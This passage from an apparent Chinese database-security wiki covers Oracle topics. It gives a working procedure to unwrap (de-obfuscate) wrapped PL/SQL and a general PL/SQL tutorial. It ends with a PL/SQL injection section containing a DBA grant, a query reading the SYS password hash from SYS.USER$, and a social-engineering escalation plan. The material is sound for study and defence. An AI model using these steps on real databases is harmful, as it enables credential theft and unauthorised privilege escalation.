VALUES (abc.xr,abc.dr); Commit; Else Select Count(*) Into nCnt From sys.idltranslate WHERE c_base64decode = abc.xr AND c_lzdeflatecode=abc.dr; If nCnt &lt; 1 Then DBMS_OUTPUT.PUT_LINE(&#x27;wrong orginal char:&#x27;||vchar||&#x27; hex base64:&#x27;||abc.xr); End If; End If; End Loop; End Loop; End Loop;end;/ ​ 等待运行一段时间 ​ 筛选出sys.idltranslate表前10条数据： 1select * from sys.idltranslate where rownum&lt;=10; ​ 运行上面这段SQL大概会产生200多条记录： 1select count(*) c_base64decode from sys.idltranslate; ​ 还未达到00-FF总共256条记录，建议替换 1select &#x27;procedure &#x27;||vChar txt from dual ​ 中的procedure关健字为package或者function类似的，继续运行直到替换表中有不重复的256条记录为止。有了替换表的内容，就可以unwrap出明文。 替换表的值 13D6585B318DBE287F152AB634BB5A05F7D687B9B24C228678ADEA4261E03EB176F343E7A3FD2A96A0FE935561FB14D1078D975F6BC4104816106F9ADD6D5297E869E79E505BA84CC6E278EB05DA8F39FD0A271B858DD2C38994C480755E4538C46B62DA5AF322240DC50C3A1258B9C16605CCFFD0C981CD4376D3C3A30E86C3147F533DA43C8E35E1994ECE6A39514E09D64FA5915C52FCABB0BDFF297BF0A76B449445A1DF0009621807F1A82394FC1A7D70DD1D8FF139370EE5BEFBE09B97772E7B254B72AC7739066200E51EDF87C8F2EF412C62B83CDACCB3BC44EC069366202AE88FCAA4208A64557D39ABDE1238D924A1189746B91FBFEC901EA1BF7CE 3.2.4 编写Unwrap PL/SQL程序​ 写unwrap.sql程序，思路反向操作，得到密文的替换串，截取20字节后的替换串，然后查表得到LZ压缩串，再通过LZ_java包解压得到明文： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182set serveroutput on;create directory FILEPATH as &#x27;D:\\sql_files&#x27;; --创建一个路径FILEPATHgrant read,write on directory FILEPATH to sys; --给用户sys授予路径读写的权限create or replace procedure unwrap(o in varchar,n in varchar, t in varchar)as vWrappedtext Varchar2(32767); vtrimtext Varchar2(32767); vChar Varchar2(2); vRepchar Varchar2(2); vLZinflatestr Varchar2(32767); nLen Integer; nLoop Integer; nCnt Integer; l_file utl_file.file_type;type vartab is table of varchar2(2) index by varchar2(2);mytbl vartab;cursor getchar is select C_BASE64DECODE xr,C_LZDEFLATECODE dr from sys.idltranslate;Begin for i in getchar loop --sys.idltranslate表内容存到字符数组 mytbl(i.xr):=i.dr; end loop; vtrimtext:=&#x27;&#x27;; select count(*) into nCnt from DBA_SOURCE Where owner=o And Name = n And Type = t ; if nCnt &gt;0 and nCnt &lt;5 then for i in 1..nCnt loop if i=1 then select rtrim( substr( TEXT, instr( TEXT, chr( 10 ), 1, 20 ) + 1 ), chr(10) ) --保存去掉换行的BASE64码正文 into vLZinflatestr from DBA_SOURCE Where owner = o And Name = n And Type = t and line=i; else select text into vLZinflatestr from DBA_SOURCE Where owner = o And Name = n And Type=t and line=i; end if; vtrimtext:=vtrimtext||vLZinflatestr; end loop; end if; vtrimtext:=replace(vtrimtext,chr(10),&#x27;&#x27;); nLen := Length(vtrimtext)/64 ; vWrappedtext :=&#x27;&#x27;; for i in 0..nLen loop if i&lt; nLen then vWrappedtext:=vWrappedtext||utl_encode.base64_decode( utl_raw.cast_to_raw(substrb(vtrimtext,64*i+1 , 64 ))) ; else vWrappedtext:=vWrappedtext||utl_encode.base64_decode( utl_raw.cast_to_raw(substrb(vtrimtext,64*i+1 ))) ; end if; --DBMS_OUTPUT.PUT_LINE(vWrappedtext); End Loop; --vWrappedtext:=substr(vWrappedtext,41); nLen := Length(vWrappedtext)/2 - 1; vLZinflatestr :=&#x27;&#x27;; For nLoop In 20..nLen Loop --从第21字节开始 vChar := Substrb(vWrappedtext,nLoop*2+1,2); /* Select Count(*) Into nCnt From SYS.IDLTRANSLATE Where C_BASE64DECODE=vChar; If nCnt &lt;&gt; 1 Then DBMS_OUTPUT.PUT_LINE(&#x27;SUBSTATION TABLE WARNING: Count not find following char--&#x27;||vChar); Return; Else Select C_LZDEFLATECODE Into vRepchar From SYS.IDLTRANSLATE Where C_BASE64DECODE=vChar; End If; */ vLZinflatestr := vLZinflatestr || mytbl(vChar); --从字符数组匹配 --DBMS_OUTPUT.PUT_LINE(vLZinflatestr); End Loop; --DBMS_OUTPUT.PUT_LINE(vLZinflatestr); l_file := utl_file.fopen(&#x27;FILEPATH&#x27;, &#x27;unwrap_text.sql&#x27;, &#x27;W&#x27;); --给文件变量赋予一个初值unwrap_text.sql，最后一个参数W表示写入 utl_file.put_line(l_file, amosunwrapper.inflate(vLZinflatestr)); utl_file.fclose(l_file);--关闭文件 DBMS_OUTPUT.PUT_LINE(amosunwrapper.inflate(vLZinflatestr));End;/ 4. Wrap和Unwrap过程1.先编一个需要wrap的sql文件，test.sql： 1234567891011121314151617181920212223242526272829303132create or replace function test_f(hy in varchar)return varcharasx varchar(2);beginselectcasewhen hy &gt;=&#x27;01&#x27; and hy&lt;= &#x27;05&#x27; then 1when hy &gt;=&#x27;06&#x27; and hy&lt;= &#x27;11&#x27; then 2when hy &gt;=&#x27;13&#x27; and hy&lt;= &#x27;43&#x27; then 3when hy &gt;=&#x27;44&#x27; and hy&lt;= &#x27;46&#x27; then 4when hy &gt;=&#x27;47&#x27; and hy&lt;= &#x27;50&#x27; then 5when hy &gt;=&#x27;51&#x27; and hy&lt;= &#x27;59&#x27; then 6when hy &gt;=&#x27;60&#x27; and hy&lt;= &#x27;62&#x27; then 7when hy =&#x27;63&#x27; or hy = &#x27;65&#x27; then 8when hy &gt;=&#x27;66&#x27; and hy&lt;= &#x27;67&#x27; then 9when hy &gt;=&#x27;68&#x27; and hy&lt;= &#x27;71&#x27; then 10when hy &gt;=&#x27;72&#x27; and hy&lt;= &#x27;72&#x27; then 11when hy &gt;=&#x27;73&#x27; and hy&lt;= &#x27;74&#x27; then 12when hy &gt;=&#x27;75&#x27; and hy&lt;= &#x27;78&#x27; then 13when hy &gt;=&#x27;79&#x27; and hy&lt;= &#x27;81&#x27; then 14when hy &gt;=&#x27;82&#x27; and hy&lt;= &#x27;83&#x27; then 15when hy &gt;=&#x27;84&#x27; and hy&lt;= &#x27;84&#x27; then 16when hy &gt;=&#x27;85&#x27; and hy&lt;= &#x27;87&#x27; then 17when hy &gt;=&#x27;88&#x27; and hy&lt;= &#x27;92&#x27; then 18when hy &gt;=&#x27;93&#x27; and hy&lt;= &#x27;98&#x27; then 19else nullendinto x from dual;return x;end;/ 2.用wrap工具加密test.sql文件，在cmd里运行wrap工具 123C:\\Users\\Tahir&gt; wrap iname=C:\\Users\\Tahir\\Desktop\\instantclient_12_1\\test.sql oname=C:\\Users\\Tahir\\Desktop\\instantclient_12_1\\test.plbwrap iname=C:\\Users\\Tahir\\Desktop\\instantclient_12_1\\test2.sql oname=C:\\Users\\Tahir\\Desktop\\instantclient_12_1\\test2.plb 3.用plb文件创建函数 4.测试函数 1select sys.test_f(&#x27;45&#x27;) from dual; 5.加密后的内容 6.利用unwrap.sql进行解密 首先执行@unwrap.sql，生成unwrap储存过程 调用unwrap存储过程，对test_f进行解密 1exec sys.unwrap(&#x27;SYS&#x27;,&#x27;TEST_F&#x27;,&#x27;FUNCTION&#x27;); 测试的时候，发现解压LZ会报错 1java.util.zip.ZipException: oversubscribed dynamic bit lengths tree java jdk版本过低，更换版本后解决，执行成功。","tags":[{"name":"Oracle Database","slug":"Oracle-Database","permalink":"http://example.com/tags/Oracle-Database/"}],"categories":[{"name":"数据库安全","slug":"数据库安全","permalink":"http://example.com/categories/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/"},{"name":"Oracle Database","slug":"数据库安全/Oracle-Database","permalink":"http://example.com/categories/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle-Database/"}]},{"title":"Oracle Database PL/SQL注入漏洞原理","date":"2021-07-03T03:05:40.000Z","path":"wiki/数据库安全/Oracle Database/Oracle-Database-PLSQL基础原理/","text":"[TOC] by Tahir 1.PL/SQL概述PL/SQL是一种ORACLE数据库服务器的编程语言 继承了ADA（ 阿达·洛芙莱斯）第4代语言的特点 PL/SQL是一个可移植、高效的事务处理语言： 支持SQL 支持面向对象编程 良好的性能 效率高 可移植 与Oracle集成 高度安全 PL/SQL的编码和运行时系统是一项技术，而不是一个独立的产品。可以把这项技术想象成一个能够编译并运行PL/SQL块和子程序的引擎。这个引擎可以安装在Oracle服务器上或安装在Oracle Forms，Oracle Reports这样的开发工具中。所以，PL/SQL可以在两种环境中存在： Oracle数据库服务器 Oracle开发工具 这两种环境是独立的。PL/SQL虽被绑定到Oracle服务器上，但在某些工具中是无法使用的。在这两种环境下，PL/SQL引擎都能接受有效的PL/SQL块或子程序。下图是PL/SQL引擎处理匿名块的过程，引擎会处理过程化语句，而把SQL语句发送给Oracle服务器端的SQL语句执行程序(SQL Statement Executor)来处理。 1.1 PL/SQL 块结构12345678[DECLARE] declaration_statementsBEGIN executable_statements[EXCEPTION] exception_handing_statementsEND 1.2 PL/SQL 变量和类型1.2.1 变量声明语法：variable_name [CONSTANT] type [NOT NULL] [:=value]; variable_name: 用于定义变量名，变量名的命名要符合标识符命名规范。 type: 变量需要使用的数据类型，可以使用所有SQL类型或PL/SQL类型。用方括号 [] 括起来的是可选部分。 CONSTANT: 表示声明为一个常量，常量在定义时需要指定初始值，一旦定义其值，不能再被改变。 NOT NULL: 用于约束变量的值不能为空。 :=value: 用于为变量赋初始值。 12345678DECLARE v_empname VARCHAR2(20); --定义员工名称变量 v_deptname VARCHAR2(20); --定义部门名称变量 v_hiredate DATE NOT NULL := SYSDATE; --定义入职日期变量 v_empno INT NOT NULL DEFAULT 1111; --变量员工编码变量BEGIN NULL; --不执行任何代码END; ​ 注： :=和DEFAULT是可以互换使用的，都用来为变量赋初始值。一旦出现了NOT NULL关键字，后面必须具有赋初始值的语句。 类型 子类 说 明 范 围 ORACLE限制 CHAR CharacterStringRowidNchar 定长字符串 民族语言字符集 0à32767可选,确省=1 2000 VARCHAR2 Varchar, StringNVARCHAR2 可变字符串民族语言字符集 0à327674000 4000 BINARY_INTEGER 带符号整数,为整数计算优化性能 NUMBER(p,s) Dec Double precisionIntegerIntNumericRealSmall int 小数, NUMBER 的子类型高精度实数整数, NUMBER 的子类型整数, NUMBER 的子类型与NUMBER等价与NUMBER等价整数, 比 integer 小 LONG 变长字符串 0-&gt;2147483647 32,767字节 DATE 日期型 公元前4712年1月1日至公元后4712年12月31日 BOOLEAN 布尔型 TRUE, FALSE,NULL 不使用 ROWID 存放数据库行号 UROWID 通用行标识符，字符类型 如果变量在声明时没有指定初始值，默认情况下，变量被初始化为NULL值。如果未给变量赋值，就直接使用变量，将会产生意想不到的结果。 根据变量的不同类型，可以为变量直接赋常量值，也可以使用表达式来计算变量的值。 下面的代码根据薪资和加薪比例来计算员工的结果薪资值： 123456789DECLARE v_salary NUMBER(7,2); v_rate NUMBER(7,2) :=0.12; v_base_salary NUMBER(7,2) :=1200;BEGIN v_salary := v_base_salary*(1+v_rate); --使用表达式为变量赋值 DBMS_OUTPUT.put_line(&#x27;员工的薪资值为：&#x27;||v_salary);END; 在为PL/SQL变量赋值时，需要注意变量的类型。下面列出了常用的变量类型的赋值方式。 1234567891011DECLARE v_string VARCHAR2(200); v_hire_date DATE; v_bool BOOLEAN; --PL/SQL布尔类型BEGIN v_bool:=True; --为布尔类型赋值 v_hire_date:=to_date(&#x27;2019-04-28&#x27;,&#x27;yyyy-mm-dd&#x27;); --使用函数为日期赋值 v_hire_date:=SYSDATE; --使用日期函数赋值 v_hire_date:=date&#x27;2019-04-28&#x27;; --直接赋静态日期值 v_string:=&#x27;this is a string&#x27;;END; 1.2.2 游标Oracle使用工作区(work area)来执行SQL语句，并保存处理信息。PL/SQL可以让我们使用游标来为工作区命名，并访问存储的信息。游标的类型有两种：隐式和显式。PL/SQL会为所有的SQL数据操作声明一个隐式的游标，包括只返回一条记录的查询操作。对于返回多条记录的查询，我们可以显式地声明一个游标来处理每一条记录。如下例： 12345DECLARE CURSOR c1 IS SELECT empno, ename, job FROM emp WHERE deptno = 20; 由多行查询返回的行集合称为结果集(result set)。它的大小就是满足我们查询条件的行的个数。如下图所示，显式游标”指向”当前行的记录，这可以让我们的程序每次处理一条记录。 多行查询处理有些像文件处理。例如，一个COBOL程序打开一个文件，处理记录，然后关闭文件。同样，一个PL/SQL程序打开一个游标，处理查询出来的行，然后关闭游标。就像文件指针能标记打开文件中的当前位置一样，游标能标记出结构集的当前位置。 我们可以使用OPEN，FETCH和CLOSE语句来控制游标，OPEN用于打开游标并使游标指向结果集的第一行，FETCH会检索当前行的信息并把游标指移向下一行，当最后一行也被处理完后，CLOSE就会关闭游标。 1.2.3 游标FOR循环在大多需要使用显式游标的情况下，我们都可以用一个简单的游标FOR循环来代替OPEN，FETCH和CLOSE语句。首先，游标FOR循环会隐式地声明一个代表当前行的循环索引(loop index)变量。下一步，它会打开游标，反复从结果集中取得数据并放到循环索引的各个域(field)中。当所有行都被处理过以后，它就会关闭游标。下面的例子中，游标FOR循环隐式地声明了一个emp_rec记录： 1234567891011DECLARE CURSOR c1 IS SELECT ename, sal, hiredate, deptno FROM emp; ...BEGIN FOR emp_rec IN c1 LOOP ... salary_total := salary_total + emp_rec.sal; END LOOP;END; 为了使用每一个查询到的行中的每一个字段，我们可以使用点标志(dot notation)，它的作用就像一个域选择器。 1.2.4 游标变量游标变量的使用方式和游标类似，但更加灵活，因为它不绑定于某个特定的查询，所以可用于打开任何返回类型相兼容的查询语句。游标变量是真正的PL/SQL变量，我们可以为它赋值，把它传递给子程序。如下例，我们把游标变量作为存储过程open_cv的一个参数传进去，程序执行时，可以根据choice值的不同，灵活地打开不同的查询内容。 1234567891011121314151617PROCEDURE open_cv(generic_cv IN OUT genericcurtyp, choice NUMBER) ISBEGIN IF choice = 1 THEN OPEN generic_cv FOR SELECT * FROM emp; ELSIF choice = 2 THEN OPEN generic_cv FOR SELECT * FROM dept; ELSIF choice = 3 THEN OPEN generic_cv FOR SELECT * FROM salgrade; END IF; ...END; 1.2.5 属性PL/SQL的变量和游标都有着让我们能够直接引用它们各自的数据类型或结构的属性。数据库字段和表也有类似的属性。”%”是一个属性的指示符。 %TYPE %TYPE可以提供一个变量或数据库字段的数据类型，这在声明存放数据库值的变量时是非常有用的。假设我们要声明一个存放表books中的字段my_title的字段的变量时，就可以这样使用%TYPE属性： 1my_title books.title%TYPE; 这样声明my_title有两个优点，第一，我们不必知道title具体类型；第二，如果我们改变了数据库中对该字段的数据类型定义的话，my_title的数据类型会在运行时做出相应的改变，并不需要手动地进行维护。 %ROWTYPE 在PL/SQL中，记录用于将逻辑相关数据组织起来。一个记录是由许多相关域的组合。%ROWTYPE属性返回一个记录类型，其数据类型和数据表的数据结构相一致。这样的记录类型可以完全保存从数据表中查询(SELECT)或从游标/游标变量取出(FETCH)的行记录。 行中的字段和记录中的域对应的名称和数据类型都完全一致。下面的例子中，我们声明一个dept_rec的记录。它的域名称和数据类型与表dept中的字段名称和数据类型就完全一样。 1DECLARE dept_rec dept%ROWTYPE; -- declare record variable 我们可以使用”.”来引用记录中的域。 1my_deptno := dept_rec.deptno; 假设我们声明了一个用于检索雇员的名字、工资、雇用日期和职称的游标，我们就可以使用%ROWTYPE来声明一个类型相同的记录，如下例： 1234567DECLARE CURSOR c1 IS SELECT ename, sal, hiredate, job FROM emp; emp_rec c1%ROWTYPE; -- declare record variable that represents -- a row fetched from the emp table 当我们执行语句 1FETCH c1 INTO emp_rec; 表emp中ename字段的值就会赋给emp_rec的ename域，sal字段值赋给sal域，依此类推。 1.3 PL/SQL 控制语句1.3.1 简单IF结构123IF &lt;布尔表达式&gt; THEN 满足条件时执行的语句END IF; 1.3.2 IF-ELSE结构12345IF &lt;布尔表达式&gt; THEN 满足条件时执行的语句ELSE 不满足条件时执行的语句END IF; 1.3.3 多重IF123456789IF &lt;布尔表达式1&gt; THEN 满足条件1时执行的语句ELSIF &lt;布尔表达式2&gt; THEN 满足条件2时执行的语句ELSIF &lt;布尔表达式3&gt; THEN 满足条件3时执行的语句ELSE 满足条件1、2、3均不满足时执行的语句END IF; 注意：ELSIF不能写成ELSEIF 1.3.4 CASE语法一： 12345678910CASE 条件表达式 WHEN 条件表达式结果1 THEN 语句1 WHEN 条件表达式结果2 THEN 语句2 ...... WHEN 条件表达式结果n THEN 语句n [ELSE 条件表达式结果]END CASE; 语法二： 12345678910CASE WHEN 条件表达式1 THEN 语句1 WHEN 条件表达式2 THEN 语句2 ...... WHEN 条件表达式n THEN 语句n [ELSE 语句]END CASE; 1.3.5 简单循环语法： 1234LOOP 循环体语句; [EXIT WHEN &lt;条件语句&gt;]END LOOP; 1.3.6 WHILE循环语法： 123WHILE &lt;布尔表达式&gt; LOOP 循环体语句;END LOOP; 1.3.7 FOR循环语法： 1234[&lt;&lt;标签&gt;&gt;]FOR 循环计数器 IN [ REVERSE ] 下限 .. 上限 LOOP 循环体语句;END LOOP [&lt;&lt;标签&gt;&gt;]; 说明： 使用关键字REVERSE，循环变量自动减1。跟在IN REVERSE后面的数字应是从小到大的顺序，而且必须是整数，不能是变量或表达式。 1.3.8 GOTOGOTO语句用于跳转到指定&lt;&lt;标号&gt;&gt;去执行语句，是无条件跳转到指定的标号去的意思。 注意：标号是用&lt;&lt; &gt;&gt;括起来的标识符。 语法： 1GOTO label; GOTO语句缺点是会增加程序的复杂性，降低可读性，所以Oracle建议不要使用。 1.3.9 NULL空语句，执行没有任何实际效果，可以使某些语句变得有意义，提高程序的可读性，保证其他语句结构的完整性和正确性，通常用于占位置。 1.4 PL/SQL 子程序子程序就是能够接受参数并被其他程序所调用的命名PL/SQL块。PL/SQL子程序有两种类型，过程和函数。 一般地，过程用于执行一个操作，而函数用于计算一个结果值。 与未命名或匿名PL/SQL块一样，子程序也有声明部分，执行部分和一个可选的异常处理部分。声明部分包含类型、游标、常量、变量、异常和嵌套子程序的声明。这些内容都是本地的，在程序退出时会自动销毁。执行部分包含赋值语句、流程控制语句和Oracle的数据操作语句。异常处理部分包含异常处理程序。思考下面用于记入借方银行账户的debit_account过程： 1234567891011121314151617181920212223PROCEDURE debit_account(acct_id INTEGER, amount REAL) IS old_balance REAL; new_balance REAL; overdrawn EXCEPTION;BEGIN SELECT bal INTO old_balance FROM accts WHERE acct_no = acct_id; new_balance := old_balance - amount; IF new_balance &lt; 0 THEN RAISE overdrawn; ELSE UPDATE accts SET bal = new_balance WHERE acct_no = acct_id; END IF; EXCEPTION WHEN overdrawn THEN ...END debit_account; 在被调用时，这个过程接受一个银行账号和借贷金额。它使用账号从accts表中查询账目结算信息。然后用借款金额计算新的账目结算。如果计算后的余额比零小，异常就会被抛出；否则，该账号相关信息就会被更新。 1.4.1 理解PL/SQL过程过程是一个能执行某个特定操作的子程序。我们可以用下面的语法来编写过程： 12345678910[CREATE [OR REPLACE]] PROCEDURE procedure_name[(parameter[, parameter]...)] [AUTHID &#123;DEFINER | CURRENT_USER&#125;] &#123;IS | AS&#125; [PRAGMA AUTONOMOUS_TRANSACTION;] [local declarations] BEGIN executable statements [EXCEPTION exception handlers]END [name]; parameter的含义如下： 12parameter_name [IN | OUT [NOCOPY] | IN OUT [NOCOPY]] datatype [&#123;:= | DEFAULT&#125; expression] CREATE子句能让我们创建保存在数据库中的独立过程。我们可以从SQLPlus中或是在使用动态SQL的程序中执行CREATE PROCEDURE语句。 AUTHID子句决定了存储过程是按所有者权限(默认)调用还是按当前用户权限执行，也能决定在没有限定修饰词的情况下，对所引用的对象是按所有者模式进行解析还是按当前用户模式进行解析。我们可以指定CURRENT_USER来覆盖掉程序的默认行为。 编译指示AUTONOMOUS_TRANSACTION会告诉PL/SQL编译器把过程标记为自治(独立)。自治事务能让我们把主事务挂起，执行SQL操作，提交或回滚自治事务，然后再恢复主事务。 我们不能对参数的数据类型进行约束，如下例中对acct_id的声明就是不合法的，因为它对CHAR类型进行了长度限制： 1PROCEDURE reconcile (acct_id CHAR(5)) IS ... -- illegal 但是，我们可以使用下面的方法间接的对字符的长度进行限制： 123DECLARE SUBTYPE Char5 IS CHAR(5); PROCEDURE reconcile (acct_id Char5) IS ... 过程有两个部分，过程说明和过程体。说明部分由关键字PROCEDURE开头，以过程名或参数列表结尾。参数声明是可选的。没有参数的过程是不用使用圆括号的。 过程体由关键字IS(或AS)开头，并以END结尾，END后面可以跟上一个可选的过程名。过程体有三个部分：声明、执行和可选的异常处理。 声明部分包括本地声明，它处于IS和BEGIN之间。在匿名PL/SQL块使用的关键字DECLARE在这里不再需要。执行部分包括许多语句，它们被放到BEGIN和EXCEPTION(或END)之间，并且至少要有一条语句出现在过程的执行部分。NULL语句可以满足这个需求。异常处理部分包含异常处理程序，它被放在关键字EXCEPTION和END之间。 在下面的过程raise_salary中，我们会根据给定的金额来为雇员加薪： 12345678910111213141516171819202122232425PROCEDURE raise_salary(emp_id INTEGER, amount REAL) IS current_salary REAL; salary_missing EXCEPTION; BEGIN SELECT sal INTO current_salary FROM emp WHERE empno = emp_id; IF current_salary IS NULL THEN RAISE salary_missing; ELSE UPDATE emp SET sal = sal + amount WHERE empno = emp_id; END IF; EXCEPTION WHEN NO_DATA_FOUND THEN INSERT INTO emp_audit VALUES (emp_id, *&#x27;No such number&#x27;*); WHEN salary_missing THEN INSERT INTO emp_audit VALUES (emp_id, *&#x27;Salary is null&#x27;*); END raise_salary; 在调用时，过程接受雇员编号和薪资调整金额，然后用雇员编号从emp表找出指定雇员的当前工资。如果雇员编号无法找到或是当前工资为空，异常就会被抛出，否则工资就会被更新。 过程可以作为一个PL/SQL语句来调用。例如，我们可以像下面这样调用raise_salary： 1raise_salary(emp_id, amount); 1.4.2 理解PL/SQL函数函数是一个能够计算结果值的子程序，函数除了有一个RETURN子句之外，其它结构跟过程类似。我们可以用下面的语法来编写(本地)函数： 1234567891011121314151617181920[CREATE [OR REPLACE ] ] FUNCTION function_name [ ( parameter [ , parameter ]... ) ] RETURN datatype [ AUTHID &#123; DEFINER | CURRENT_USER &#125; ] [ PARALLEL_ENABLE [ &#123; [CLUSTER parameter BY (column_name [, column_name ]... ) ] | [ORDER parameter BY (column_name [ , column_name ]... ) ] &#125; ] [ ( PARTITION parameter BY &#123; [ &#123;RANGE | HASH &#125; (column_name [, column_name]...)] | ANY &#125; ) ] ] [DETERMINISTIC] [ PIPELINED [ USING implementation_type ] ] [ AGGREGATE [UPDATE VALUE] [WITH EXTERNAL CONTEXT] USING implementation_type ] &#123;IS | AS&#125; [ PRAGMA AUTONOMOUS_TRANSACTION; ] [ local declarations ] BEGIN executable statements [ EXCEPTION exception handlers ] END [ name ]; 函数的语法结构与过程类似，这里就不再重复。但有几个不同点还是需要注意的。 PARALLEL_ENABLE选项能声明一个在并发DML操作的从属会话(slave session)中被安全调用的存储函数。主(logon)会话的状态不会被从属会话所共享。每个从属会话都有它自己的状态，这是在会话开始时初始化的。函数的结果不应依赖于会话(静态)变量的状态。否则结果就可能随着会话而发生变化。 提示DETERMINISTIC能帮助优化程序避免冗余的函数调用。如果存储函数的调用跟前一次调用时所使用的参数相同，优化程序就直接选出前一次的计算结果值。函数结果不应该依赖于会话变量或模式对象的状态。否则结果会随着调用而发生变化。只有DETERMINISTIC函数才允许被函数索引或是参数query_rewrite_enabled为TRUE的实体化视图调用。 我们不能对参数或是函数返回值的类型添加约束，但可以像前面的过程那样使用间接的约束方法。 1.5 包-PackagePL/SQL可以让我们把逻辑相关的类型、变量、游标和子程序放在一个包内，这样更加清楚易理解。包通常有两部分组成：包说明部分和包体部分。包说明部分是应用程序的接口，它声明了类型、常量、变量、异常、游标和可以使用的子程序。包体用于实现包说明部分声明的子程序和游标。 下面的例子是把两个雇用相关的过程进行打包： 12345678910111213141516171819CREATE PACKAGE emp_actions AS -- package specification PROCEDURE hire_employee(empno NUMBER, ename CHAR, ...); PROCEDURE fire_employee(emp_id NUMBER);END emp_actions;CREATE PACKAGE BODY emp_actions AS -- package body PROCEDURE hire_employee(empno NUMBER, ename CHAR, ...) IS BEGIN INSERT INTO emp VALUES (empno, ename, ...); END hire_employee; PROCEDURE fire_employee(emp_id NUMBER) IS BEGIN DELETE FROM emp WHERE empno = emp_id; END fire_employee;END emp_actions; 只有在包说明中声明的内容对应用程序是可见的，而包体中的内容是不可见，无法访问的。包被编译后会存放到数据库中，当我们首次调用包中的子程序时，整个包就会被加载到内存当中，所以，后续的调用不再涉及到磁盘的读取问题。因此，包可以提高效率改善性能。 1.4.1 PL/SQL包的优点包提供了几个优点：模块化、方便应用程序设计、信息隐藏、附加功能和良好的性能。 模块化 包能让我们把逻辑相关的类型、常量、变量、异常和子程序等放到一个命名的PL/SQL模块中。每一个包都容易理解，包与包之间接口简单、清晰。这将有助于程序开发。 轻松的程序设计 设计应用程序时，我们首先要确定的是包说明中的接口信息。我们可以在没有包体的条件下编写并编译说明部分。然后引用该包的存储子程序也会被编译。在完成整个应用程序之前，我们是不需要完全实现包体部分的。 信息隐藏 有了包，我们就可以指定哪些类型、常量、变量、异常和子程序等是公有(可见和可访问)或私有(隐藏和不可访问)。例如，如果一个包里包含了四个子程序，其中三个是公有的一个是私有的。包就会隐藏私有子程序的实现，这样的话，如果实现内容发生改变，受到影响的只有包本身(不是我们的应用程序)。同样，对用户隐藏实现细节也能保证包的完整性。 附加功能 打包公有变量和游标在一个会话期会一直存在。所以，它们可以被当前环境下的所有子程序共享。并且它们允许我们跨事务来维护数据而不用把它保存在数据库中。 良好的性能 在我们首次调用打包子程序时，整个包就会被加载到内存中。所以，以后调用包中的相关子程序时，就不需要再次读取磁盘了。包能阻塞级联依赖，这样就能避免不必要的编译。例如，如果我们改变打包函数的实现，Oracle不需要重新编译调用子程序，因为它们并不依赖于包体。 1.4.2 理解包体包体是对包说明的实现。也就是说包体中包含了包说明中声明的每一个游标和子程序的实现。一定要记住，包体内实现的内容只有在包说明中声明之后才能在包外引用。为了匹配包说明和包体，PL/SQL做了一个token-by-token的子程序头比较。所以，除了空白内容，头部内容必须完全一致。否则，PL/SQL就会抛出异常，如下例所示： 1234567891011121314CREATE PACKAGE emp_actions AS ... PROCEDURE calc_bonus(date_hired emp.hiredate%TYPE, ...);END emp_actions;CREATE PACKAGE BODY emp_actions AS ... PROCEDURE calc_bonus(date_hired DATE, ...) IS -- parameter declaration raises an exception because &#x27;DATE&#x27;* -- does not match &#x27;emp.hiredate%TYPE&#x27; word for word* BEGIN ... END;END emp_actions; 1.4.3 包特性的例子下面是一个名为emp_actions的包。包说明声明了类型、游标、异常和子程序： 类型EmpRecTyp和DeptRecTyp 游标desc_salary 异常invalid_salary 函数hire_employee和raise_salary 过程fire_empire和raise_salary 在编写包之后，我们就可以开发引用它声明的类型，调用它的子程序、游标和异常的应用程序。创建包时，它就会被存放在Oracle数据库中供广泛地调用。 12345678910111213141516171819202122232425262728293031323334CREATE PACKAGE emp_actions AS /* Declare externally visible types, cursor, exception. */ TYPE emprectyp IS RECORD( emp_id INT, salary REAL ); TYPE deptrectyp IS RECORD( dept_id INT, LOCATION VARCHAR2 ); CURSOR desc_salary RETURN emprectyp; invalid_salary EXCEPTION; /* Declare externally callable subprograms. */ FUNCTION hire_employee( ename VARCHAR2, job VARCHAR2, mgr REAL, sal REAL, comm REAL, deptno REAL ) RETURN INT; PROCEDURE fire_employee(emp_id INT); PROCEDURE raise_salary(emp_id INT, grade INT, amount REAL); FUNCTION nth_highest_salary(n INT) RETURN emprectyp;END emp_actions; 2.PL/SQL 注入漏洞2.1 Oracle 权限在创建用户之前，可以登录系统管理员权限去创建一个用户（因为系统管理员有这个权限），下面是三种用户分类： 123sys； //系统管理员，拥有最高权限system；//本地管理员，次高权限scott； //普通用户，密码默认为tiger,默认未解锁 在登陆的时候，可以选择下面三种登录方式： 123sqlplus / as sysdba； //登陆sys帐户sqlplus sys as sysdba；//同上sqlplus scott/tiger； //登陆普通用户scott 可以参考Oracle安全标签机制（OLS-BLP模型） 定义者权限（默认情况下） 调用者权限（AUTHID RURRENT_USER） 2.2 PL/SQL 注入分类 用户权限 具体权限 漏洞数 影响广度 解决方案 高 EXECUTE ANT PROCEDURE 多 大 降低用户权限、升级补丁、取消 public权限 高 CREATE ANY TRIGGER 少 大 降低用户权限、升级补丁、取消 public权限 高 CREATE ANY VIEW 少 大 降低用户权限、升级补丁、取消 public权限 中 CREATE functions 少 大 降低用户权限、升级补丁、取消 public权限 中 CREATE procedure 少 大 降低用户权限、升级补丁、取消 public权限 低 CREATE connection-注入匿名 少 大 升级补丁、取消 public权限 低 CREATE connection-snarf攻击 极少 大 注意关闭游标 低 CREATE connection-利用java 极少 小 删除Java、取消 public权限 2.3 PL/SQL 漏洞利用定义者权限和调用者权限 1GRANT DBA TO USER 1SELECT PASSWORD FROM SYS.USER$ WHERE NAME=&#x27;SYS&#x27;; 用调用者权限创建一个函数——————————-&gt;用带有public权限的SYS函数调用黑客创建的函数 标准SQL注入提权思路例子： 1.用低权限用户写一个调用者权限的函数get_dba，内容是低权限用户无法执行的提权操作，并设置运行时编译。 2.将get_dba函数放入public，使得高权限用户可以防问；社会工程学诱骗，sys用户执行get_dba函数，成功提取。 2.4 PL/SQL DBMS_SQL包2.4.1 DBMS_SQL执行流程通常运用DBMS_SQL包一般分为如下几步： open cursor：打开cursor parse cursor：解析你要执行的SQL语句，生成任务计划 bind variable：如果要执行的SQL语句中包含变量，在此就需要绑定变量 execute：执行SQL语句 close cursor：在执行后关闭此cursor. 如果你还需要返回执行SQL的结果集，还需要使用define_column,define_array等方法，具体可以看如下流程图： 2.4.2 DBMS_SQL特点 一定条件下可执行任意语句 1DBMS_SQL_PARSE(C IN INTEGER, STATUMENT IN 